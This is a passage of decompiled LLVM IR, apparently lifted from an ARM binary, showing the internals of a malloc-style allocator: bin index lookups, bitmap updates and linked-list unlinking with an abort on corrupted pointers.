  %v2_28c58 = add i32 %v1_28c58, ptrtoint (i32* @global_var_44990.1184 to i32)
  %v3_28c58 = inttoptr i32 %v2_28c58 to i32*
  %v4_28c58 = load i32, i32* %v3_28c58, align 4
  %v3_28c5c = udiv i32 %v0_28c4c, 8
  store i32 %v3_28c5c, i32* %r0.global-to-local, align 4
  %v4_28c60 = mul nuw i32 %v3_28c5c, 8
  %v5_28c60 = add i32 %v4_28c58, %v4_28c60
  store i32 %v5_28c60, i32* %r3.global-to-local, align 4
  %v1_28c64 = add i32 %v5_28c60, 44
  store i32 %v1_28c64, i32* %ip.global-to-local, align 4
  %v1_28c68 = add i32 %v5_28c60, 52
  %v2_28c68 = inttoptr i32 %v1_28c68 to i32*
  %v3_28c68 = load i32, i32* %v2_28c68, align 4
  store i32 %v3_28c68, i32* @lr, align 4
  br label %dec_label_pc_28cc8

dec_label_pc_28c70:                               ; preds = %dec_label_pc_28c4c
  store i32 %v0_28c4c, i32* %r0.global-to-local, align 4
  %v1_28c74 = call i32 @__malloc_largebin_index(i32 %v0_28c4c)
  store i32 %v1_28c74, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %ip.global-to-local, align 4
  %v1_28c7c = load i32, i32* %r8.global-to-local, align 4
  %v2_28c7c = add i32 %v1_28c7c, ptrtoint (i32* @global_var_44990.1184 to i32)
  %v3_28c7c = inttoptr i32 %v2_28c7c to i32*
  %v4_28c7c = load i32, i32* %v3_28c7c, align 4
  %v4_28c80 = mul i32 %v1_28c74, 8
  %v5_28c80 = add i32 %v4_28c7c, %v4_28c80
  store i32 %v5_28c80, i32* %r3.global-to-local, align 4
  %v1_28c84 = add i32 %v5_28c80, 44
  store i32 %v1_28c84, i32* %ip.global-to-local, align 4
  %v1_28c88 = add i32 %v5_28c80, 52
  %v2_28c88 = inttoptr i32 %v1_28c88 to i32*
  %v3_28c88 = load i32, i32* %v2_28c88, align 4
  store i32 %v3_28c88, i32* @lr, align 4
  %v9_28c8c = icmp eq i32 %v3_28c88, %v1_28c84
  br i1 %v9_28c8c, label %dec_label_pc_28cc8, label %dec_label_pc_28c94

dec_label_pc_28c94:                               ; preds = %dec_label_pc_28c70
  %v1_28c94 = add i32 %v5_28c80, 56
  %v2_28c94 = inttoptr i32 %v1_28c94 to i32*
  %v3_28c94 = load i32, i32* %v2_28c94, align 4
  store i32 %v3_28c94, i32* %r1.global-to-local, align 4
  %v1_28c98 = add i32 %v3_28c94, 4
  %v2_28c98 = inttoptr i32 %v1_28c98 to i32*
  %v3_28c98 = load i32, i32* %v2_28c98, align 4
  store i32 %v3_28c98, i32* %r3.global-to-local, align 4
  %v0_28c9c = load i32, i32* %r4.global-to-local, align 4
  %v3_28c9c = icmp ult i32 %v0_28c9c, %v3_28c98
  br i1 %v3_28c9c, label %.thread, label %dec_label_pc_28cb8.preheader

.thread:                                          ; preds = %dec_label_pc_28c94
  store i32 %v1_28c84, i32* @lr, align 4
  store i32 %v3_28c94, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_28cc8

dec_label_pc_28cb8.preheader:                     ; preds = %dec_label_pc_28c94
  %v2_28ca4 = or i32 %v0_28c9c, 1
  store i32 %v2_28ca4, i32* %r2.global-to-local, align 4
  %v1_28cb8179 = add i32 %v3_28c88, 4
  %v2_28cb8180 = inttoptr i32 %v1_28cb8179 to i32*
  %v3_28cb8181 = load i32, i32* %v2_28cb8180, align 4
  store i32 %v3_28cb8181, i32* %r3.global-to-local, align 4
  %v3_28cbc183 = icmp ult i32 %v2_28ca4, %v3_28cb8181
  br i1 %v3_28cbc183, label %dec_label_pc_28cb4, label %dec_label_pc_28cc4

dec_label_pc_28cb4:                               ; preds = %dec_label_pc_28cb8.preheader, %dec_label_pc_28cb4
  %v0_28cc4184 = phi i32 [ %v3_28cb4, %dec_label_pc_28cb4 ], [ %v3_28c88, %dec_label_pc_28cb8.preheader ]
  %v1_28cb4 = add i32 %v0_28cc4184, 8
  %v2_28cb4 = inttoptr i32 %v1_28cb4 to i32*
  %v3_28cb4 = load i32, i32* %v2_28cb4, align 4
  store i32 %v3_28cb4, i32* @lr, align 4
  %v1_28cb8 = add i32 %v3_28cb4, 4
  %v2_28cb8 = inttoptr i32 %v1_28cb8 to i32*
  %v3_28cb8 = load i32, i32* %v2_28cb8, align 4
  store i32 %v3_28cb8, i32* %r3.global-to-local, align 4
  %v3_28cbc = icmp ult i32 %v2_28ca4, %v3_28cb8
  br i1 %v3_28cbc, label %dec_label_pc_28cb4, label %dec_label_pc_28cc4

dec_label_pc_28cc4:                               ; preds = %dec_label_pc_28cb4, %dec_label_pc_28cb8.preheader
  %v0_28cc4.lcssa = phi i32 [ %v3_28c88, %dec_label_pc_28cb8.preheader ], [ %v3_28cb4, %dec_label_pc_28cb4 ]
  %v1_28cc4 = add i32 %v0_28cc4.lcssa, 12
  %v2_28cc4 = inttoptr i32 %v1_28cc4 to i32*
  %v3_28cc4 = load i32, i32* %v2_28cc4, align 4
  store i32 %v3_28cc4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_28cc8

dec_label_pc_28cc8:                               ; preds = %.thread, %dec_label_pc_28c70, %dec_label_pc_28c54, %dec_label_pc_28cc4
  %v0_28ce8 = phi i32 [ %v1_28c84, %dec_label_pc_28c70 ], [ %v1_28c64, %dec_label_pc_28c54 ], [ %v3_28cc4, %dec_label_pc_28cc4 ], [ %v3_28c94, %.thread ]
  %v0_28cdc = phi i32 [ %v1_28c74, %dec_label_pc_28c70 ], [ %v3_28c5c, %dec_label_pc_28c54 ], [ %v1_28c74, %dec_label_pc_28cc4 ], [ %v1_28c74, %.thread ]
  %v1_28ccc = phi i32 [ %v1_28c7c, %dec_label_pc_28c70 ], [ %v1_28c58, %dec_label_pc_28c54 ], [ %v1_28c7c, %dec_label_pc_28cc4 ], [ %v1_28c7c, %.thread ]
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  %v2_28ccc = add i32 %v1_28ccc, ptrtoint (i32* @global_var_44990.1184 to i32)
  %v3_28ccc = inttoptr i32 %v2_28ccc to i32*
  %v4_28ccc = load i32, i32* %v3_28ccc, align 4
  %v3_28cd0 = sdiv i32 %v0_28cdc, 32
  store i32 %v3_28cd0, i32* %r3.global-to-local, align 4
  %v4_28cd4 = mul nsw i32 %v3_28cd0, 4
  %v5_28cd4 = add i32 %v4_28ccc, %v4_28cd4
  store i32 %v5_28cd4, i32* %r1.global-to-local, align 4
  %v1_28cd8 = add i32 %v5_28cd4, 820
  %v2_28cd8 = inttoptr i32 %v1_28cd8 to i32*
  %v3_28cd8 = load i32, i32* %v2_28cd8, align 4
  %v1_28cdc = urem i32 %v0_28cdc, 32
  store i32 %v1_28cdc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_28ce4 = shl i32 1, %v1_28cdc
  %v8_28ce4 = or i32 %v3_28cd8, %v7_28ce4
  store i32 %v8_28ce4, i32* %r3.global-to-local, align 4
  %v1_28ce8 = load i32, i32* @r6, align 4
  %v2_28ce8 = add i32 %v1_28ce8, 12
  %v3_28ce8 = inttoptr i32 %v2_28ce8 to i32*
  store i32 %v0_28ce8, i32* %v3_28ce8, align 4
  %v0_28cec = load i32, i32* @lr, align 4
  %v1_28cec = load i32, i32* @r6, align 4
  %v2_28cec = add i32 %v1_28cec, 8
  %v3_28cec = inttoptr i32 %v2_28cec to i32*
  store i32 %v0_28cec, i32* %v3_28cec, align 4
  %v0_28cf0 = load i32, i32* %r3.global-to-local, align 4
  %v1_28cf0 = load i32, i32* %r1.global-to-local, align 4
  %v2_28cf0 = add i32 %v1_28cf0, 820
  %v3_28cf0 = inttoptr i32 %v2_28cf0 to i32*
  store i32 %v0_28cf0, i32* %v3_28cf0, align 4
  %v0_28cf4 = load i32, i32* @r6, align 4
  %v1_28cf4 = load i32, i32* @lr, align 4
  %v2_28cf4 = add i32 %v1_28cf4, 12
  %v3_28cf4 = inttoptr i32 %v2_28cf4 to i32*
  store i32 %v0_28cf4, i32* %v3_28cf4, align 4
  %v0_28cf8 = load i32, i32* @r6, align 4
  %v1_28cf8 = load i32, i32* %ip.global-to-local, align 4
  %v2_28cf8 = add i32 %v1_28cf8, 8
  %v3_28cf8 = inttoptr i32 %v2_28cf8 to i32*
  store i32 %v0_28cf8, i32* %v3_28cf8, align 4
  %v0_28d14.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_28d14

dec_label_pc_28d00:                               ; preds = %dec_label_pc_28ba0, %dec_label_pc_28b58, %dec_label_pc_28bb4
  store i32 92, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r1.global-to-local, align 4
  %v4_28d08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_28d08, i32* @sb, align 4
  %v0_28d0c = load i32, i32* @sl, align 4
  %v1_28d0c = add i32 %v0_28d0c, 16
  store i32 %v1_28d0c, i32* @fp, align 4
  %v1_28d10 = add i32 %v4_28d08, 52
  store i32 %v1_28d10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_28d14

dec_label_pc_28d14:                               ; preds = %dec_label_pc_28cc8, %dec_label_pc_28d00
  %v0_28c34 = phi i32 [ %v0_28d14.pre, %dec_label_pc_28cc8 ], [ %v1_28d10, %dec_label_pc_28d00 ]
  %v1_28d14 = add i32 %v0_28c34, 12
  %v2_28d14 = inttoptr i32 %v1_28d14 to i32*
  %v3_28d14 = load i32, i32* %v2_28d14, align 4
  store i32 %v3_28d14, i32* @r6, align 4
  %v9_28d18 = icmp eq i32 %v3_28d14, %v0_28c34
  br i1 %v9_28d18, label %dec_label_pc_28d20, label %dec_label_pc_28bc8

dec_label_pc_28d20:                               ; preds = %dec_label_pc_28d14
  %v0_28d20 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_28d20, 256
  %v0_28dd8.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_28d20.dec_label_pc_28dd8_crit_edge, label %dec_label_pc_28d28

dec_label_pc_28d20.dec_label_pc_28dd8_crit_edge:  ; preds = %dec_label_pc_28d20
  %.pre200 = mul i32 %v0_28dd8.pre, 8
  br label %dec_label_pc_28dd8

dec_label_pc_28d28:                               ; preds = %dec_label_pc_28d20
  %v4_28d28 = mul i32 %v0_28dd8.pre, 8
  %v5_28d28 = add i32 %v4_28d28, %v0_28c34
  store i32 %v5_28d28, i32* %r3.global-to-local, align 4
  %v1_28d2c = add i32 %v5_28d28, -8
  store i32 %v1_28d2c, i32* %r1.global-to-local, align 4
  %v1_28d30 = add i32 %v5_28d28, 4
  %v2_28d30 = inttoptr i32 %v1_28d30 to i32*
  %storemerge.pre = load i32, i32* %v2_28d30, align 4
  br label %dec_label_pc_28dd0

dec_label_pc_28d38:                               ; preds = %dec_label_pc_28dd0
  %v1_28d38 = add i32 %v1_28d60, 4
  %v2_28d38 = inttoptr i32 %v1_28d38 to i32*
  %v3_28d38 = load i32, i32* %v2_28d38, align 4
  store i32 %v3_28d38, i32* %r3.global-to-local, align 4
  %v1_28d3c = and i32 %v3_28d38, -4
  store i32 %v1_28d3c, i32* %r2.global-to-local, align 4
  %v3_28d40 = icmp ult i32 %v1_28d3c, %v0_28d20
  %v1_28d44 = add i32 %v1_28d60, 12
  %v2_28d44 = inttoptr i32 %v1_28d44 to i32*
  %v3_28d44 = load i32, i32* %v2_28d44, align 4
  store i32 %v3_28d44, i32* %r0.global-to-local, align 4
  br i1 %v3_28d40, label %dec_label_pc_28dd0, label %dec_label_pc_28d4c

dec_label_pc_28d4c:                               ; preds = %dec_label_pc_28d38
  %v1_28d4c = add i32 %v1_28d60, 8
  %v2_28d4c = inttoptr i32 %v1_28d4c to i32*
  %v3_28d4c = load i32, i32* %v2_28d4c, align 4
  store i32 %v3_28d4c, i32* %r1.global-to-local, align 4
  %v1_28d50 = add i32 %v3_28d4c, 12
  %v2_28d50 = inttoptr i32 %v1_28d50 to i32*
  %v3_28d50 = load i32, i32* %v2_28d50, align 4
  store i32 %v3_28d50, i32* %r3.global-to-local, align 4
  %v9_28d54 = icmp eq i32 %v3_28d50, %v1_28d60
  br i1 %v9_28d54, label %dec_label_pc_28d5c, label %dec_label_pc_28d68

dec_label_pc_28d5c:                               ; preds = %dec_label_pc_28d4c
  %v1_28d5c = add i32 %v3_28d44, 8
  %v2_28d5c = inttoptr i32 %v1_28d5c to i32*
  %v3_28d5c = load i32, i32* %v2_28d5c, align 4
  store i32 %v3_28d5c, i32* %r3.global-to-local, align 4
  %v9_28d60 = icmp eq i32 %v3_28d5c, %v1_28d60
  br i1 %v9_28d60, label %dec_label_pc_28d6c, label %dec_label_pc_28d68

dec_label_pc_28d68:                               ; preds = %dec_label_pc_28d4c, %dec_label_pc_28d5c
  %v0_28d68 = call i32 @abort()
  store i32 %v0_28d68, i32* %r0.global-to-local, align 4
  %v0_28d6c.pre = load i32, i32* @sl, align 4
  %v1_28d6c.pre = load i32, i32* @r2, align 4
  %v0_28d74.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_28d6c

dec_label_pc_28d6c:                               ; preds = %dec_label_pc_28d5c, %dec_label_pc_28d68
  %v1_28d74 = phi i32 [ %v3_28d44, %dec_label_pc_28d5c ], [ %v0_28d68, %dec_label_pc_28d68 ]
  %v0_28d74 = phi i32 [ %v3_28d4c, %dec_label_pc_28d5c ], [ %v0_28d74.pre, %dec_label_pc_28d68 ]
  %v1_28d6c = phi i32 [ %v1_28d3c, %dec_label_pc_28d5c ], [ %v1_28d6c.pre, %dec_label_pc_28d68 ]
  %v0_28d6c = phi i32 [ %v0_28d20, %dec_label_pc_28d5c ], [ %v0_28d6c.pre, %dec_label_pc_28d68 ]
  %v2_28d6c = sub i32 %v1_28d6c, %v0_28d6c
  store i32 %v2_28d6c, i32* %lr.global-to-local, align 4
  %v2_28d74 = add i32 %v1_28d74, 8
  %v3_28d74 = inttoptr i32 %v2_28d74 to i32*
  store i32 %v0_28d74, i32* %v3_28d74, align 4
  %v0_28d78 = load i32, i32* %r0.global-to-local, align 4
  %v1_28d78 = load i32, i32* %r1.global-to-local, align 4
  %v2_28d78 = add i32 %v1_28d78, 12
  %v3_28d78 = inttoptr i32 %v2_28d78 to i32*
  store i32 %v0_28d78, i32* %v3_28d78, align 4
  %v0_28d7c = load i32, i32* %ip.global-to-local, align 4
  %v1_28d7c = add i32 %v0_28d7c, 8
  store i32 %v1_28d7c, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_28d6c, 15
  br i1 %tmp207, label %dec_label_pc_28d9c, label %dec_label_pc_28d84

dec_label_pc_28d84:                               ; preds = %dec_label_pc_28d6c
  %v1_28d84 = load i32, i32* %r2.global-to-local, align 4
  %v2_28d84 = add i32 %v1_28d84, %v0_28d7c
  store i32 %v2_28d84, i32* %r2.global-to-local, align 4
  %v1_28d88 = add i32 %v2_28d84, 4
  %v2_28d88 = inttoptr i32 %v1_28d88 to i32*
  %v3_28d88 = load i32, i32* %v2_28d88, align 4
  store i32 %v3_28d88, i32* %r3.global-to-local, align 4
  store i32 %v1_28d7c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_28d90

dec_label_pc_28d90.loopexit:                      ; preds = %dec_label_pc_28c30
  %v1_28c3c = load i32, i32* @r6, align 4
  %v2_28c3c = load i32, i32* @sl, align 4
  %v3_28c3c = add i32 %v2_28c3c, %v1_28c3c
  store i32 %v3_28c3c, i32* %r2.global-to-local, align 4
  %v2_28c40 = add i32 %v3_28c3c, 4
  %v3_28c40 = inttoptr i32 %v2_28c40 to i32*
  %v4_28c40 = load i32, i32* %v3_28c40, align 4
  store i32 %v4_28c40, i32* %r3.global-to-local, align 4
  %v2_28c44 = add i32 %v1_28c3c, 8
  store i32 %v2_28c44, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_28d90

dec_label_pc_28d90:                               ; preds = %.dec_label_pc_28d90_crit_edge, %dec_label_pc_28d90.loopexit, %dec_label_pc_28d84
  %v1_28d94 = phi i32 [ %v4_28eb8, %.dec_label_pc_28d90_crit_edge ], [ %v3_28c3c, %dec_label_pc_28d90.loopexit ], [ %v2_28d84, %dec_label_pc_28d84 ]
  %v0_28d90 = phi i32 [ %v7_28eb8, %.dec_label_pc_28d90_crit_edge ], [ %v4_28c40, %dec_label_pc_28d90.loopexit ], [ %v3_28d88, %dec_label_pc_28d84 ]
  %v1_28d90 = or i32 %v0_28d90, 1
  store i32 %v1_28d90, i32* %r3.global-to-local, align 4
  %v2_28d94 = add i32 %v1_28d94, 4
  %v3_28d94 = inttoptr i32 %v2_28d94 to i32*
  store i32 %v1_28d90, i32* %v3_28d94, align 4
  br label %dec_label_pc_29350

dec_label_pc_28d9c:                               ; preds = %dec_label_pc_28d6c
  %v1_28d9c = load i32, i32* @sl, align 4
  %v2_28d9c = add i32 %v1_28d9c, %v0_28d7c
  store i32 %v2_28d9c, i32* %r2.global-to-local, align 4
  %v1_28da0 = or i32 %v1_28d9c, 1
  store i32 %v1_28da0, i32* %r3.global-to-local, align 4
  %v0_28da4 = load i32, i32* %lr.global-to-local, align 4
  %v1_28da4 = or i32 %v0_28da4, 1
  store i32 %v1_28da4, i32* %r1.global-to-local, align 4
  store i32 %v1_28d7c, i32* %r4.global-to-local, align 4
  %v2_28dac = add i32 %v0_28d7c, 4
  %v3_28dac = inttoptr i32 %v2_28dac to i32*
  store i32 %v1_28da0, i32* %v3_28dac, align 4
  %v0_28db0 = load i32, i32* %r2.global-to-local, align 4
  %v1_28db0 = load i32, i32* @r6, align 4
  %v2_28db0 = add i32 %v1_28db0, 8
  %v3_28db0 = inttoptr i32 %v2_28db0 to i32*
  store i32 %v0_28db0, i32* %v3_28db0, align 4
  %v0_28db4 = load i32, i32* %r2.global-to-local, align 4
  %v1_28db4 = load i32, i32* @r6, align 4
  %v2_28db4 = add i32 %v1_28db4, 12
  %v3_28db4 = inttoptr i32 %v2_28db4 to i32*
  store i32 %v0_28db4, i32* %v3_28db4, align 4
  %v0_28db8 = load i32, i32* %lr.global-to-local, align 4
  %v1_28db8 = load i32, i32* %r2.global-to-local, align 4
  %v3_28db8 = add i32 %v1_28db8, %v0_28db8
  %v4_28db8 = inttoptr i32 %v3_28db8 to i32*
  store i32 %v0_28db8, i32* %v4_28db8, align 4
  %v0_28dbc = load i32, i32* %r1.global-to-local, align 4
  %v1_28dbc = load i32, i32* %r2.global-to-local, align 4
  %v2_28dbc = add i32 %v1_28dbc, 4
  %v3_28dbc = inttoptr i32 %v2_28dbc to i32*
  store i32 %v0_28dbc, i32* %v3_28dbc, align 4
  %v0_28dc0 = load i32, i32* @r6, align 4
  %v1_28dc0 = load i32, i32* %r2.global-to-local, align 4
  %v2_28dc0 = add i32 %v1_28dc0, 12
  %v3_28dc0 = inttoptr i32 %v2_28dc0 to i32*
  store i32 %v0_28dc0, i32* %v3_28dc0, align 4
  %v0_28dc4 = load i32, i32* @r6, align 4
  %v1_28dc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_28dc4 = add i32 %v1_28dc4, 8
  %v3_28dc4 = inttoptr i32 %v2_28dc4 to i32*
  store i32 %v0_28dc4, i32* %v3_28dc4, align 4
  br label %dec_label_pc_29350

dec_label_pc_28dd0:                               ; preds = %dec_label_pc_28d38, %dec_label_pc_28d28
  %v1_28d60 = phi i32 [ %storemerge.pre, %dec_label_pc_28d28 ], [ %v3_28d44, %dec_label_pc_28d38 ]
  store i32 %v1_28d60, i32* %ip.global-to-local, align 4
  %v9_28dd0 = icmp eq i32 %v1_28d60, %v1_28d2c
  br i1 %v9_28dd0, label %dec_label_pc_28dd8.loopexit, label %dec_label_pc_28d38

dec_label_pc_28dd8.loopexit:                      ; preds = %dec_label_pc_28dd0
  br label %dec_label_pc_28dd8

dec_label_pc_28dd8:                               ; preds = %dec_label_pc_28d20.dec_label_pc_28dd8_crit_edge, %dec_label_pc_28dd8.loopexit
  %v4_28e08.pre-phi = phi i32 [ %.pre200, %dec_label_pc_28d20.dec_label_pc_28dd8_crit_edge ], [ %v4_28d28, %dec_label_pc_28dd8.loopexit ]
  %v1_28dd8 = add i32 %v0_28dd8.pre, 1
  store i32 %v1_28dd8, i32* %r2.global-to-local, align 4
  %v1_28ddc = urem i32 %v1_28dd8, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r0.global-to-local, align 4
  %v6_28de8 = shl i32 1, %v1_28ddc
  store i32 %v6_28de8, i32* %ip.global-to-local, align 4
  store i32 92, i32* %r3.global-to-local, align 4
  %v4_28df0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_28df0, i32* %r3.global-to-local, align 4
  %v3_28df4 = udiv i32 %v1_28dd8, 32
  store i32 %v3_28df4, i32* @r5, align 4
  %v4_28df8 = mul nuw nsw i32 %v3_28df4, 4
  %v5_28df8 = add i32 %v4_28df0, %v4_28df8
  store i32 %v5_28df8, i32* %r2.global-to-local, align 4
  %v1_28dfc = add i32 %v5_28df8, 820
  %v2_28dfc = inttoptr i32 %v1_28dfc to i32*
  %v3_28dfc = load i32, i32* %v2_28dfc, align 4
  store i32 %v3_28dfc, i32* @r4, align 4
  %v1_28e00 = add i32 %v4_28df0, 52
  store i32 %v1_28e00, i32* %r3.global-to-local, align 4
  store i32 92, i32* @r8, align 4
  %v5_28e08 = add i32 %v1_28e00, %v4_28e08.pre-phi
  store i32 %v5_28e08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_28e0c

dec_label_pc_28e0c:                               ; preds = %dec_label_pc_28e74, %dec_label_pc_28dd8
  %v1_28e14 = phi i32 [ %v1_28e14.pre, %dec_label_pc_28e74 ], [ %v3_28dfc, %dec_label_pc_28dd8 ]
  %v0_28e14 = phi i32 [ %v0_28e0c.pre, %dec_label_pc_28e74 ], [ %v6_28de8, %dec_label_pc_28dd8 ]
  %v1_28e0c = sub i32 1, %v0_28e14
  %v2_28e0c = icmp ult i32 %v0_28e14, 2
  %v1_28e0c. = select i1 %v2_28e0c, i32 %v1_28e0c, i32 0
  store i32 %v1_28e0c., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_28e14, %v1_28e14
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_28e0c
  %v5_28e18 = or i32 %v1_28e0c., 1
  store i32 %v5_28e18, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28e24.preheader

bb142:                                            ; preds = %dec_label_pc_28e0c
  %v2_28e1c = icmp eq i32 %v1_28e0c., 0
  br i1 %v2_28e1c, label %.dec_label_pc_28e60.preheader_crit_edge, label %dec_label_pc_28e24.preheader

.dec_label_pc_28e60.preheader_crit_edge:          ; preds = %bb142
  %v0_28e5854.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_28e60.preheader

dec_label_pc_28e24.preheader:                     ; preds = %bb142, %.thread12
  %v0_28e24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_28e24

dec_label_pc_28e24:                               ; preds = %dec_label_pc_28e24.preheader, %dec_label_pc_28e30
  %v0_28e24 = phi i32 [ %v0_28e24.pre, %dec_label_pc_28e24.preheader ], [ %v1_28e24, %dec_label_pc_28e30 ]
  %v1_28e24 = add i32 %v0_28e24, 1
  store i32 %v1_28e24, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_28e24, 2
  br i1 %tmp208, label %dec_label_pc_28f04.loopexit, label %dec_label_pc_28e30

dec_label_pc_28e30:                               ; preds = %dec_label_pc_28e24
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r3.global-to-local, align 4
  %v1_28e34 = load i32, i32* @r8, align 4
  %v2_28e34 = add i32 %v1_28e34, ptrtoint (i32* @global_var_44990.1184 to i32)
  %v3_28e34 = inttoptr i32 %v2_28e34 to i32*
  %v4_28e34 = load i32, i32* %v3_28e34, align 4
  store i32 %v4_28e34, i32* %r2.global-to-local, align 4
  %v4_28e38 = mul i32 %v1_28e24, 4
  %v5_28e38 = add i32 %v4_28e34, %v4_28e38
  store i32 %v5_28e38, i32* %r3.global-to-local, align 4
  %v1_28e3c = add i32 %v5_28e38, 820
  %v2_28e3c = inttoptr i32 %v1_28e3c to i32*
  %v3_28e3c = load i32, i32* %v2_28e3c, align 4
  store i32 %v3_28e3c, i32* @r4, align 4
  %v2_28e40 = icmp eq i32 %v3_28e3c, 0
  br i1 %v2_28e40, label %dec_label_pc_28e24, label %dec_label_pc_28e48

dec_label_pc_28e48:                               ; preds = %dec_label_pc_28e30
  %v4_28e48 = mul i32 %v1_28e24, 256
  %v5_28e48 = add i32 %v4_28e34, %v4_28e48
  store i32 %v5_28e48, i32* %r3.global-to-local, align 4
  %v1_28e4c = add i32 %v5_28e48, 44
  store i32 %v1_28e4c, i32* %r0.global-to-local, align 4
  %v0_28e50 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_28e50, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_28e60.preheader

dec_label_pc_28e60.preheader:                     ; preds = %.dec_label_pc_28e60.preheader_crit_edge, %dec_label_pc_28e48
  %v0_28e5854 = phi i32 [ %v1_28e4c, %dec_label_pc_28e48 ], [ %v0_28e5854.pre, %.dec_label_pc_28e60.preheader_crit_edge ]
  %v0_28e7c = phi i32 [ %v3_28e3c, %dec_label_pc_28e48 ], [ %v1_28e14, %.dec_label_pc_28e60.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_28e50, %dec_label_pc_28e48 ], [ %v0_28e14, %.dec_label_pc_28e60.preheader_crit_edge ]
  %v2_28e6051 = and i32 %ip.promoted, %v0_28e7c
  %v4_28e6053 = icmp eq i32 %v2_28e6051, 0
  br i1 %v4_28e6053, label %dec_label_pc_28e58, label %dec_label_pc_28e68

dec_label_pc_28e58:                               ; preds = %dec_label_pc_28e60.preheader, %dec_label_pc_28e58
  %v2_28e5c56 = phi i32 [ %v2_28e5c, %dec_label_pc_28e58 ], [ %ip.promoted, %dec_label_pc_28e60.preheader ]
  %v0_28e5855 = phi i32 [ %v1_28e58, %dec_label_pc_28e58 ], [ %v0_28e5854, %dec_label_pc_28e60.preheader ]
  %v1_28e58 = add i32 %v0_28e5855, 8
  %v2_28e5c = mul i32 %v2_28e5c56, 2
  %v2_28e60 = and i32 %v2_28e5c, %v0_28e7c
  %v4_28e60 = icmp eq i32 %v2_28e60, 0
  br i1 %v4_28e60, label %dec_label_pc_28e58, label %dec_label_pc_28e60.dec_label_pc_28e68_crit_edge

dec_label_pc_28e60.dec_label_pc_28e68_crit_edge:  ; preds = %dec_label_pc_28e58
  store i32 %v1_28e58, i32* %r0.global-to-local, align 4
  store i32 %v2_28e5c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_28e68

dec_label_pc_28e68:                               ; preds = %dec_label_pc_28e60.dec_label_pc_28e68_crit_edge, %dec_label_pc_28e60.preheader
  %v0_28e88 = phi i32 [ %v2_28e5c, %dec_label_pc_28e60.dec_label_pc_28e68_crit_edge ], [ %ip.promoted, %dec_label_pc_28e60.preheader ]
  %v0_28eac = phi i32 [ %v1_28e58, %dec_label_pc_28e60.dec_label_pc_28e68_crit_edge ], [ %v0_28e5854, %dec_label_pc_28e60.preheader ]
  %v1_28e68 = add i32 %v0_28eac, 12
  %v2_28e68 = inttoptr i32 %v1_28e68 to i32*
  %v3_28e68 = load i32, i32* %v2_28e68, align 4
  store i32 %v3_28e68, i32* @lr, align 4
  %v9_28e6c = icmp eq i32 %v3_28e68, %v0_28eac
  br i1 %v9_28e6c, label %dec_label_pc_28e74, label %dec_label_pc_28e94

dec_label_pc_28e74:                               ; preds = %dec_label_pc_28e68
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r0.global-to-local, align 4
  %v1_28e78 = load i32, i32* @r8, align 4
  %v2_28e78 = add i32 %v1_28e78, ptrtoint (i32* @global_var_44990.1184 to i32)
  %v3_28e78 = inttoptr i32 %v2_28e78 to i32*
  %v4_28e78 = load i32, i32* %v3_28e78, align 4
  %v2_28e7c = sub i32 -1, %v0_28e88
  %v3_28e7c = and i32 %v0_28e7c, %v2_28e7c
  store i32 %v3_28e7c, i32* @r4, align 4
  %v1_28e80 = load i32, i32* @r5, align 4
  %v4_28e80 = mul i32 %v1_28e80, 4
  %v5_28e80 = add i32 %v4_28e80, %v4_28e78
  store i32 %v5_28e80, i32* %r3.global-to-local, align 4
  %v1_28e84 = add i32 %v0_28eac, 8
  store i32 %v1_28e84, i32* %r0.global-to-local, align 4
  %v2_28e88 = mul i32 %v0_28e88, 2
  store i32 %v2_28e88, i32* %ip.global-to-local, align 4
  %v2_28e8c = add i32 %v5_28e80, 820
  %v3_28e8c = inttoptr i32 %v2_28e8c to i32*
  store i32 %v3_28e7c, i32* %v3_28e8c, align 4
  %v0_28e0c.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_28e14.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_28e0c

dec_label_pc_28e94:                               ; preds = %dec_label_pc_28e68
  %v1_28e94 = add i32 %v3_28e68, 4
  %v2_28e94 = inttoptr i32 %v1_28e94 to i32*
  %v3_28e94 = load i32, i32* %v2_28e94, align 4
  store i32 %v3_28e94, i32* %r3.global-to-local, align 4
  %v1_28e98 = and i32 %v3_28e94, -4
  store i32 %v1_28e98, i32* %r2.global-to-local, align 4
  %v0_28e9c = load i32, i32* @sl, align 4
  %v2_28e9c = sub i32 %v1_28e98, %v0_28e9c
